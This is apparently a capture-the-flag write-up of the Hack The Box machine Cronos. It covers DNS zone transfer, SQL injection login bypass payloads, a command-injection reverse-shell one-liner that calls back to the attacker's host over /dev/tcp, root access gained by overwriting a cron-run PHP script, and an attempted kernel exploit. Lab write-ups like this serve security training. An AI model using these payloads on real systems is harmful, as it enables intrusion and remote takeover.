## Default Information
IP Address: 10.10.10.13\
OS: Linux

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.140    cronos.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.13 --rate=1000 -e tun0
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-11-29 18:48:27 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 53/tcp on 10.10.10.13                                     
Discovered open port 53/udp on 10.10.10.13                                     
Discovered open port 80/tcp on 10.10.10.13                                     
Discovered open port 22/tcp on 10.10.10.13   
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22	| SSH | OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0) | Open |
| 53	| domain | ISC BIND 9.10.3-P4 (Ubuntu Linux) | Open |
| 80	| SSH | Apache httpd 2.4.18 ((Ubuntu)) | Open |

From the nmap output, we can see that the service at port 53 is domain. Hence, we will have to do DNS enumeration. We will first check for potential nameservers using nslookup. From the output, we can find a nameserver ns1.cronos.htb

```
┌──(kali㉿kali)-[~]
└─$ nslookup               
> server 10.10.10.13
Default server: 10.10.10.13
Address: 10.10.10.13#53
> 10.10.10.13
13.10.10.10.in-addr.arpa        name = ns1.cronos.htb.
> 
```

Next, we will test for zone transfer using dig. From the output, we discover another 22 subdomains, namely admin.cronos.htb and www.cronos.htb

```
┌──(kali㉿kali)-[~]
└─$ dig axfr cronos.htb @10.10.10.13                                                     1 ⚙

; <<>> DiG 9.17.19-3-Debian <<>> axfr cronos.htb @10.10.10.13
;; global options: +cmd
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 735 msec
;; SERVER: 10.10.10.13#53(10.10.10.13) (TCP)
;; WHEN: Mon Nov 29 13:52:51 EST 2021
;; XFR size: 7 records (messages 1, bytes 203)
```

Before we continue, we will modify the /etc/hosts file to include all the nameservers and subdomains

```
10.10.10.13    cronos.htb ns1.cronos.htb admin.cronos.htb www.cronos.htb
```
### Gobuster
We will then use Gobuster to find the endpoints that are accessible from http://cronos.htb

```
http://10.10.10.13:80/index.html           (Status: 200) [Size: 11439]
http://10.10.10.13:80/.                    (Status: 200) [Size: 11439]
```

Next, we will use Gobuster again to find for virtual hosts that we might have missed out. However, we are unable to find other virtual hosts that we might have missed out.

Afterwards, we will use Gobuster to find for directories that can be accessible from admin.cronos.htb.

```
http://admin.cronos.htb/config.php           (Status: 200) [Size: 0]
http://admin.cronos.htb/index.php            (Status: 200) [Size: 1547]
http://admin.cronos.htb/index.php            (Status: 200) [Size: 1547]
http://admin.cronos.htb/logout.php           (Status: 302) [Size: 0] [--> index.php]
http://admin.cronos.htb/session.php          (Status: 302) [Size: 0] [--> index.php]
http://admin.cronos.htb/welcome.php          (Status: 302) [Size: 439] [--> index.php]

```

### Web-content discovery

Visiting http://cronos.htb, we are unable to find much endpoints which could be exploited, but we discover that most of the endpoints that can be accessed redirects to pages related to laravel.

Looking at http://admin.cronos.htb, we find that we are presented with a login page. However, we do not know the correct credentials to login to the site.

## Exploit
### SQL Injection
First, let us bruteforce login with commonly-used username and passwords using WFUZZ but unfortunately, we are unable to find any valid credentials

```
┌──(kali㉿kali)-[~/Desktop]
└─$ wfuzz -c -z file,/usr/share/seclists/Usernames/top-usernames-shortlist.txt -z file,/usr/share/seclists/Passwords/2020-200_most_used_passwords.txt -d "username=FUZZ&password=FUZ2Z" --hc 200 http://admin.cronos.htb
=====================================================================
ID           Response   Lines    Word       Chars       Payload                     
=====================================================================


Total time: 123.0559
Processed Requests: 3400
Filtered Requests: 3400
Requests/sec.: 27.62970
```

Next, let us try to use SQL injection payload to try to authenticate into the site using WFUZZ. Fortunately, this time round, we are able to find some payloads that can authenticate into the site. 

```
┌──(kali㉿kali)-[~]
└─$ wfuzz -c -z file,/home/kali/Desktop/auth_bypass.txt -d "username=FUZZ&password=FUZZ" --hc 200 http://admin.cronos.htb
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                            
=====================================================================

000000046:   302        56 L     139 W      1547 Ch     "admin' or 1=1# - admin' or 1=1#"                                                                                                                  
000000043:   302        56 L     139 W      1547 Ch     "admin'or 1=1 or ''=' - admin'or 1=1 or ''='"                                                                                                      
000000039:   302        56 L     139 W      1547 Ch     "admin' or '1'='1 - admin' or '1'='1"                                                                                                              
000000041:   302        56 L     139 W      1547 Ch     "admin' or '1'='1'# - admin' or '1'='1'#"                                                                                                          
000000037:   302        56 L     139 W      1547 Ch     "admin' # - admin' #"                                                                                                                              

Total time: 3.780672
Processed Requests: 77
Filtered Requests: 72
Requests/sec.: 20.36674
```

Using ```username=%22admin%27+or+1%3D1%23+&password=admin%27+or+1%3D1%23%22``` as the payload, we are able to authenticate into the site. We are then redirected to a site that allows us to send ping/traceroute commands.

![Network tool](https://github.com/joelczk/writeups/blob/main/HTB/Images/Cronos/net_tool.png)

### Command Injection
Examining furthur, we realized that we can do command injection as well using the payload ```8.8.8.8;ls```

![Command Injection](https://github.com/joelczk/writeups/blob/main/HTB/Images/Cronos/command_injection.pngg)

Knowing that we can then use as ```8.8.8.8;/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.4:4000 0>&1'```a payload to spawn a reverse shell

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -nlvp 4000       
listening on [any] 4000 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.13] 38008
bash: cannot set terminal process group (1390): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cronos:/var/www/admin$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<min$ python3 -c 'import pty;pty.spawn("/bin/bash")'                         
www-data@cronos:/var/www/admin$ export TERM=xterm
export TERM=xterm.
www-data@cronos:/var/www/admin$ stty cols 132 rows 34
stty cols 132 rows 34
www-data@cronos:/var/www/admin$ 
```

### Obtaining user flag
```
www-data@cronos:/var/www/admin$ cat /home/noulis/user.txt
cat /home/noulis/user.txt
<Redacted user flag>

```
### Privilege Escalation to root
From the LinEnum script, we realize that there is a php script running at /var/www/laravel/artisan that is being executed in the crontab. Furthur verification also proved that /var/www/laravel/artisan is a php script. Apart from that, we also realize that this crontab is being executed by the root user. 
```
[-] Crontab contents:
# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1

www-data@cronos:/tmp$ file /var/www/laravel/artisan
file /var/www/laravel/artisan
/var/www/laravel/artisan: a /usr/bin/env php script, ASCII text executable
```
Afterwards, checking the permissions of /var/www/laravel/artisan, we realize that we can replace the artisan file

```
www-data@cronos:/tmp$ ls -la /var/www/laravel/artisan
ls -la /var/www/laravel/artisan
-rwxr-xr-x 1 www-data www-data 1646 Apr  9  2017 /var/www/laravel/artisan
```

With all these information, we can then upload a php reverse shell onto the server and replace the /var/www/laravel/artisan file

```
www-data@cronos:/tmp$ cp artisan /var/www/laravel/artisan
cp artisan /var/www/laravel/artisan
```

### Obtaining root flag

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 43                                                                          1 ⚙
listening on [any] 43 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.13] 55510
Linux cronos 4.4.0-72-generic #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 15:26:01 up 18:35,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=0(root) gid=0(root) groups=0(root)
/bin/sh: 0: can't access tty; job control turned off
# cat /root/root.txt
<Redacted root flag>
# 
```

## Post-Exploitation
### Zone-transfer
We also found that cronos.htb is vulnerable to zone transfer as well.

```
┌──(kali㉿kali)-[~]
└─$ host -l cronos.htb ns1.cronos.htb                                                    1 ⨯
Using domain server:
Name: ns1.cronos.htb
Address: 10.10.10.13#53
Aliases: 

cronos.htb name server ns1.cronos.htb.
cronos.htb has address 10.10.10.13
admin.cronos.htb has address 10.10.10.13
ns1.cronos.htb has address 10.10.10.13
www.cronos.htb has address 10.10.10.13
```

### CVE-2017-16995

From LinEnum script, we are able to find the kernel information and release information of Ubuntu distribution on this machine. It seems like this machine is running on Ubuntu 16.04.2 with a kernel of 4.4.0-72-generic, which might be vulnerable to CVE-2017-16995.

```
[-] Kernel information (continued):
Linux version 4.4.0-72-generic (buildd@lcy01-17) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017

[-] Specific release information:
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.2 LTS"
NAME="Ubuntu"
VERSION="16.04.2 LTS (Xenial Xerus)"
...
```

Next, we will download the exploit code from [Exploitdb](https://www.exploit-db.com/exploits/44298). However, we realize that we are unable to compile the code on the machine as they do not have gcc. Hence, we will have to compile the code on our local machine and transfer to the reverse shell.

Unfortunately, we are unable to exploit this vulnerable on our reverse shell as the kernel version is not recognized.

```
www-data@cronos:/tmp$ chmod +x exploit
chmod +x exploit
www-data@cronos:/tmp$ ./exploit
./exploit
[.] starting
[.] checking kernel version
[-] kernel version not recognized
```
